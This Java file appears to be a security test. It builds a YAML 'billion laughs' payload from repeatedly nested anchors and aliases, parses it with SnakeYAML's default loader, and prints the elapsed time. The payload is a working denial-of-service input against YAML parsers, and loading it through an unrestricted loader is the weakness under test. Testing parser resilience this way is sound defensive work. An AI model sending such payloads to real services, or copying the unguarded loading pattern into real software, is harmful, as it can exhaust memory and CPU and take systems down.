package org.wso2.security.test.billion.laughs.yaml;

import org.yaml.snakeyaml.Yaml;

import java.util.Date;
import java.util.Map;

/**
 * Created by ayoma on 5/15/17.
 */
public class Main {
    public static void main(String[] args) {
        try {
            long start = new Date().getTime();
            String data = "a: &a [\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\",\"lol\"]\n" +
                    "b: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\n" +
                    "c: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\n" +
                    "d: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\n" +
                    "e: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\n" +
                    "f: &f [*e,*e,*e,*e,*e,*e,*e,*e,*e]\n" +
                    "g: &g [*f,*f,*f,*f,*f,*f,*f,*f,*f]\n" +
                    "h: &h [*g,*g,*g,*g,*g,*g,*g,*g,*g]\n" +
                    "i: &i [*h,*h,*h,*h,*h,*h,*h,*h,*h]\n" +

                    "j: &j [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "k: &k [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "l: &l [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "m: &m [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "n: &n [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "o: &o [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "p: &p [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "q: &q [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "r: &r [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "s: &s [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "t: &t [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "u: &u [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "v: &v [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "w: &w [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "x: &x [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "y: &y [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "z: &z [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "iq: &iq [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "iw: &iw [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ie: &ie [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ir: &ir [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "it: &it [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "iy: &iy [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "iu: &iu [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ii: &ii [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "io: &io [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ia: &ia [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "is: &is [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "id: &id [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "if: &if [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ig: &ig [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ih: &ih [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ij: &ij [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ik: &ik [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "il: &il [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "iz: &iz [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ix: &ix [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "ic: &ic [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n" +
                    "iv: &iv [*i,*i,*i,*i,*i,*i,*i,*i,*i]\n";



            Yaml yaml = new Yaml();
            Map map = (Map) yaml.load(data);
            System.out.println("Processed in : " + (new Date().getTime() - start) + " ms");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
